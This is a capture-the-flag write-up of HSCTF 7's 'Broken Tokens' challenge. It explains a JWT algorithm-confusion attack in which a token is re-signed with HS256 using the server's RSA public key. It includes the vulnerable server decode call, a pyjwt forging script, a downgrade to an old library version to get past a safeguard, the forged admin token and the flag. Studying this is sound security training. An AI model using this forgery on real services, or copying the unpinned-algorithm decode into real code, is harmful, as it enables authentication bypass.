---
title: Broken Tokens
date: 2020-06-06
tags: web
ctf: HSCTF 7
slug: /ctf-writeups/broken-tokens
---
## Problem
```
I made a login page, is it really secure?

https://broken-tokens.web.hsctf.com/

Note: If you receive an "Internal Server Error" (HTTP Status Code 500), that means that your cookie is incorrect.

Author: hmmm
```

The program also provided [main.py](./files/main.py) which appeared to be the code on the server.

## Solution
The page greets us with a web portal login, and a public key file ([publickey.pem](./files/publickey.pem)). Upon inspection, the login seemed to use server sided authentication. Trying to login with random credentials showed us a page stating ```Logged in as guest``` and left a cookie named ```auth```:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdXRoIjoiZ3Vlc3QifQ.e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw
```

The format appears to be a JWT token. Using a [web JWT tool](https://jwt.io/), we can decode the token to find more information. The header contains:
```
{
  "typ": "JWT",
  "alg": "RS256"
}
```
and there is a payload:
```
{
  "auth": "guest"
}
```

We need to create a modified JWT token that contained ```"auth": "admin"``` to gain access to the admin page, which contains the flag. The JWT token is signed using the RS256 algorithm, which is an asymmetric algorithm that uses a private and public keypair. Without any other vulnerabilities, we would need to bruteforce the private key in order to sign a modified token, which is practically impossible. Looking at the server code ([main.py](./files/main.py)), we can find some information about how the token is validated:

```
import jwt

with open("publickey.pem", "r") as f:
	PUBLIC_KEY = f.read()

def index():
	else:
		auth = request.cookies.get("auth")
		if auth is None:
			logged_in = False
			admin = False
		else:
			logged_in = True
			admin = jwt.decode(auth, PUBLIC_KEY)["auth"] == "admin"
		resp = make_response(
			render_template("index.html", logged_in=logged_in, admin=admin, flag=FLAG)
		)
	return resp
```
The server decodes the JWT token with the following line:
```
admin = jwt.decode(auth, PUBLIC_KEY)["auth"] == "admin"
```

Looking at the [pyjwt API reference](https://pyjwt.readthedocs.io/en/latest/api.html), we note that the implementation of jwt.decode() did not specify an algorithm. This means that we can attempt to create a JWT token using a different algorithm, such as HS256, which is a symmetric algorithm that uses a secret key to sign the JWT. pyjwt would then use the ```PUBLIC_KEY``` as the secret key. Since we know what ```PUBLIC_KEY``` is, we can easily create a valid token.

Copying the usage of pyjwt and opening publickey.pem in the exact same method (to prevent weird errors with newlines): ([brokentokens.py](./files/brokentokens.py))
```
import jwt

f = open("publickey.pem", "r")
PUBLIC_KEY = f.read()

key = jwt.encode({"auth": "admin"}, PUBLIC_KEY, algorithm="HS256")
print(key)
```

When attempting to run the code, we get an error:
```
"File "C:\Python38\lib\site-packages\jwt\algorithms.py", line 150, in prepare_key
    raise InvalidKeyError(
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret."
```

It seems like newer versions of pyjwt prevent signing JWT tokens with HMAC keys that are formatted as an RSA key. We can bypass this by installing an older version of pyjwt (<=0.4.3) where the exception was not implemented yet. After ```pip install pyjwt==0.4.3```, we get our new JWT token:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4
```

When we swap our cookie with the new JWT token, we are now logged in as admin and are greeted with the flag!

```
Logged in as admin
The flag is flag{1n53cur3_tok3n5_5474212}
```

**Flag:** ```flag{1n53cur3_tok3n5_5474212}```